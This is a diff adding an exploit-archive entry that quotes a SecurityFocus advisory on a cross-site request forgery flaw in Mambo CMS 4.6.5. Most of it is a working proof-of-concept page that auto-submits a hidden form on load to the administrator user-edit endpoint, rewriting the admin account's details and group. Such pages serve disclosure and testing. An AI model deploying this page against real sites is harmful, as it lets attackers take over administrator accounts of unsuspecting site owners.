@@ -1,0 +1,44 @@
+source: http://www.securityfocus.com/bid/49315/info
+
+Mambo CMS is prone to a cross-site request-forgery vulnerability.
+
+Attackers can exploit this issue by tricking an unsuspecting user into visiting a malicious Web page. The page will consist of specially crafted script code designed to perform some action on the attacker's behalf.
+
+Successful exploits will allow attackers to run privileged commands on the affected device.
+
+Mambo CMS 4.6.5 is vulnerable; other versions may also be affected. 
+
+<html>
+<head>
+ 
+</head>
+ 
+<body onload="javascript:fireForms()">
+<script language="JavaScript">
+ 
+function fireForms()
+{
+    var count = 1;
+    var i=0;
+ 
+    for(i=0; i<count; i++)
+    {
+        document.forms[i].submit();
+    }
+}
+ 
+	</script>
+<form action="http://site.com/administrator/index.php?option=com_users&task=editA&id=62&hidemainmenu=1" method="post" name="adminForm"> 
+	
+	<input type="hidden" name="name" value="Administrator" /> 
+	<input type="hidden" name="username" value="admin" /> 
+        <input type="hidden" name="email" value="" /> 
+	<input type="hidden" name="password" value="" /> 
+	<input type="hidden" name="password2" value="" /> 
+	<input type="hidden" name="gid" value="25" />				
+	<input type="radio" name="block" value="0" checked="checked" />
+	<input type="radio" name="block" value="1" />
+	<input type="radio" name="sendEmail" value="0" />
+	<input type="radio" name="sendEmail" value="1" checked="checked" />
+
+</form> 
